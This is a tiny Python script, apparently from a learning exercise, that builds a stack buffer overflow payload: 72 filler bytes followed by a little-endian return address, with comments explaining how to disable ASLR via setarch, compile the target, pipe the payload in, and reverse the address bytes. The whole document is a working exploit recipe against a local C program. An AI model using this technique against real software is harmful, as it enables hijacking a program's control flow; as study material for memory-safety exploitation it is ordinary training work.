buf = "A"*72+"\xc9\x51\x55\x55\x55\x55"
print(buf)

#0x5555555551
#0x555555555188

# setarch -RL bash
# gcc -o main main.c -Wall
# python3 script.py > entry
# ./main < entry
# take function address and separate it two by two then reverse the pairs order to put it at end of buf
